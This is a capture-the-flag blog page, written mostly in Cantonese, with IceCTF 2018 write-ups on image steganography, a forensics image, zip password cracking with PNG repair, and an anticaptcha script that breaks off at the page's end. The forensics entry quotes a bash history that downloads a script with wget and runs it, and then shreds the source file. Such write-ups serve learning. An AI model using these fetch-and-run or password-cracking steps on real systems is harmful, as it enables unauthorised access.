<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>CatPawn</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="CatPawn">
<meta property="og:url" content="https://catpawn.github.io/index.html">
<meta property="og:site_name" content="CatPawn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CatPawn">
  
    <link rel="alternate" href="/atom.xml" title="CatPawn" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">CatPawn</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://catpawn.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-IceCTF2018-Drumbone" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-Drumbone/" class="article-date">
  <time datetime="2018-09-14T12:33:04.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-Drumbone/">IceCTF2018-Drumbone</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><img src="drumbone.png" alt=""></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Stegosolve</p>
<p><img src="solved.png" alt=""></p>
<p>最後放番大D點<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageFont, ImageDraw</span><br><span class="line"></span><br><span class="line">flagImage = Image.new(<span class="string">'RGB'</span>, (<span class="number">1000</span>,<span class="number">1000</span>), <span class="string">"white"</span>)</span><br><span class="line">im = Image.open(<span class="string">'solved.bmp'</span>)</span><br><span class="line">im = im.convert(<span class="string">'RGB'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">350</span>):</span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">229</span>):</span><br><span class="line">		<span class="keyword">if</span> im.getpixel((x,y)) == (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">			dr = ImageDraw.Draw(flagImage)</span><br><span class="line">			dr.rectangle(((x,y),(x+<span class="number">5</span>,y+<span class="number">5</span>)), fill=<span class="string">"black"</span>, outline = <span class="string">"black"</span>)</span><br><span class="line">flagImage.save(<span class="string">"flag2.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="flag2.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-Drumbone/" data-id="cjm1zyku7000b1ww5ubwnumvk" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-Lost-in-the-forest" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-Lost-in-the-forest/" class="article-date">
  <time datetime="2018-09-14T12:25:42.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-Lost-in-the-forest/">IceCTF2018-Lost-in-the-forest</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="fz.zip">fz.zip</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>發現左個奇怪既file /home/hkr/.bash_history<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">git</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">ls</span><br><span class="line">ls -la</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">cat /etc/hostname</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">cat /etc/hostname</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">cat /eyc/hostname</span><br><span class="line">cat /etc/hostname</span><br><span class="line"><span class="built_in">echo</span> Centos &gt;&gt; /etc/hostname</span><br><span class="line">bash</span><br><span class="line"><span class="built_in">echo</span> Centos &gt; /etc/hostname</span><br><span class="line">bash</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">cd</span> ~/.i3</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> .i3</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> ~/.i3</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> etc</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> i3</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line">mkdir .i3</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> Documents/</span><br><span class="line">ls</span><br><span class="line">mv config ~/.i3</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> .i3</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span> documents</span><br><span class="line"><span class="built_in">cd</span> Documents/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> .i3</span><br><span class="line">ls</span><br><span class="line">sudo subl config</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> Pictures/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line">ls 0a</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> .bashrc</span><br><span class="line">sudo subl .bashrc</span><br><span class="line">sudo subl .bash_aliases</span><br><span class="line">ls</span><br><span class="line">brightness</span><br><span class="line">ls</span><br><span class="line">sudo <span class="built_in">echo</span> 200 &gt; brightness</span><br><span class="line">sudo su</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span> Downloads</span><br><span class="line">wget https://gist.githubusercontent.com/Glitch-is/bc49ee73e5413f3081e5bcf5c1537e78/raw/c1f735f7eb36a20cb46b9841916d73017b5e46a3/eRkjLlksZp</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line">sudo subl .bash_aliases</span><br><span class="line">backlight</span><br><span class="line">brightrness</span><br><span class="line">brightness</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">command</span>-list</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">sudo subl .bashrc</span><br><span class="line">sudo subl .bash_aliases</span><br><span class="line">i3-config</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">brightness</span><br><span class="line">i3-config</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">sudo subl .bashrc</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">sudo subl .bashrc</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">bash_aliases</span><br><span class="line">. ~/.bash_aliases</span><br><span class="line">sudo subl .bash_welcome</span><br><span class="line">sudo subl .bash_todo</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">todo</span><br><span class="line">to-do</span><br><span class="line">edit-todo</span><br><span class="line">to-do</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">edit-todo</span><br><span class="line"><span class="built_in">cd</span> Downloads</span><br><span class="line">ls -a</span><br><span class="line">mv eRkjLlksZp tool.py</span><br><span class="line">cat .bash_aliases</span><br><span class="line">sudo subl .bash_aliases</span><br><span class="line"><span class="built_in">alias</span>-list</span><br><span class="line">cat .bash_aliases</span><br><span class="line">ls -a</span><br><span class="line">sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386</span><br><span class="line">javac -version</span><br><span class="line">sudo apt update</span><br><span class="line">apt list --upgradable</span><br><span class="line">javac -version</span><br><span class="line">sudo apt install oracle-java8-installer</span><br><span class="line">javac -version</span><br><span class="line">sudo apt install oracle-java8-set-default</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">ls</span><br><span class="line">./studio.sh</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> android</span><br><span class="line"><span class="built_in">cd</span> Android/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">./studio.sh</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> /mnt</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span> Downloads</span><br><span class="line">./tool.py ../secret &gt; ../hzpxbsklqvboyou</span><br><span class="line">ls -a</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> usr/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">ls</span><br><span class="line">ls ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> locals</span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">local</span></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> android-studio/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">shred secret</span><br><span class="line">ls</span><br><span class="line">ls -a</span><br><span class="line">sudo subl .bash_aliases</span><br><span class="line">android-studio</span><br><span class="line">ls</span><br><span class="line">ls Documents/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> Documents/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> Downloads/</span><br><span class="line">rm tool.py</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">ls</span><br><span class="line">git</span><br><span class="line">sudo apt install git</span><br><span class="line">git config --global user.name <span class="string">"skuli"</span></span><br><span class="line">git config --global user.email <span class="string">"sheep.man@fake.com"</span></span><br><span class="line">ls -a</span><br><span class="line">cat .gitconfig</span><br><span class="line"><span class="built_in">cd</span> Documents/</span><br><span class="line">ls</span><br><span class="line">mkdir projects</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> projects</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> Downloads/</span><br><span class="line"><span class="built_in">cd</span> java/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> jre1.8.0_171/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> bin/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> jre1.8.0_171/</span><br><span class="line">ls</span><br><span class="line">cat README</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">local</span>/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> bin/</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> 3840x2160/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> .</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls -al</span><br><span class="line"><span class="built_in">cd</span> .<span class="built_in">local</span>/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> share/</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> Write/</span><br><span class="line">ls</span><br><span class="line">sudo chmod +x INSTALL</span><br><span class="line">ls</span><br><span class="line">sudo ./INSTALL</span><br><span class="line">sudo chmod -x INSTALL</span><br><span class="line">cat INSTALL</span><br><span class="line">ls</span><br><span class="line">./Write</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line">sudo rm write209.tar.gz</span><br><span class="line">sudo rm -R Write/</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">ls -al</span><br><span class="line">grep / <span class="string">"howdy"</span> 2&gt; /dev/null</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">grep -r <span class="string">"howdy"</span> 2&gt; /dev/null</span><br><span class="line">ls /lib/security/</span><br><span class="line"><span class="built_in">cd</span> /lib/security/</span><br><span class="line">ls</span><br><span class="line">ls -al</span><br><span class="line">tree</span><br><span class="line"><span class="built_in">cd</span> howdy/</span><br><span class="line">ls</span><br><span class="line">./cli</span><br><span class="line">./cli.py</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p>
<p>有個奇怪既 tools link<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gist.githubusercontent.com/Glitch-is/bc49ee73e5413f3081e5bcf5c1537e78/raw/c1f735f7eb36a20cb46b9841916d73017b5e46a3/eRkjLlksZp</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode((<span class="string">''</span>.join([chr(ord(s[x])+([<span class="number">5</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">-6</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">-3</span>,<span class="number">-5</span>,<span class="number">3</span>,<span class="number">-15</span>] * <span class="number">3</span>)[x]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(s))])).encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)[::<span class="number">-1</span>]*<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(encode(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<p>同場加映一個奇怪既file /home/hkr/hzpxbsklqvboyou<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8NHY25mYthGfs5ndwx2Zk1lcaFGc4pWdVZFQoJmT8NHY25mYthGfs5ndwx2Zk1lcaFGc4pWdVZFQoJmT8NHY25mYthGfs5ndwx2Zk1lcaFGc4pWdVZFQoJmT8NHY25mYthGfs5ndwx2Zk1lcaFGc4pWdVZFQoJmT8NHY25mYthGfs5ndwx2Zk1lcaFGc4pWdVZFQoJmT</span><br></pre></td></tr></table></figure></p>
<p>似是而非既 base64..</p>
<p>好似係用條script encode出黎架喎 , 咁調番轉黎寫囉…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">	enc = base64.b64decode(<span class="string">"8NHY25mYthGfs5ndwx2Zk1lcaFGc4pWdVZFQoJmT"</span>[::<span class="number">-1</span>])</span><br><span class="line">	mDict = ([<span class="number">5</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">-6</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">-3</span>,<span class="number">-5</span>,<span class="number">3</span>,<span class="number">-15</span>] * <span class="number">3</span>)</span><br><span class="line">	plain = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">		plain += chr(ord(enc[x]) - mDict[x])</span><br><span class="line">	<span class="keyword">print</span> plain</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-Lost-in-the-forest/" data-id="cjm1zykua000f1ww5gm1niu0v" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-HardShells" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-HardShells/" class="article-date">
  <time datetime="2018-09-14T12:16:16.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-HardShells/">IceCTF2018-HardShells</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="hardshells">hardshells</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>睇左睇個魔法頭 , 好似係 zip file. 不過有密碼<br>是但扔入去個 ARCHPR 到等左幾秒就爆左個密碼出黎<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tacos</span><br></pre></td></tr></table></figure></p>
<p>之後入面有個file 叫d<br><a href="d">d</a></p>
<p>睇個魔法頭好似係爛左個png黎<br>張圖係由0xec00開始<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xec03 改做 0x4e</span><br><span class="line">0x10800 - 0x10bf0 刪左佢</span><br><span class="line">頭尾D空白刪晒佢</span><br><span class="line">改番d crc 就完事</span><br></pre></td></tr></table></figure></p>
<p><img src="1.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/14/IceCTF2018-HardShells/" data-id="cjm1zyku8000c1ww5ldysg3e9" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-IceCTF2018-Anticaptcha" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/14/IceCTF2018-Anticaptcha/" class="article-date">
  <time datetime="2018-09-14T12:14:46.000Z" itemprop="datePublished">2018-09-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/14/IceCTF2018-Anticaptcha/">IceCTF2018-Anticaptcha</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>比左個網 , 入面有百尻幾條問題 , 自動解啦咁<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 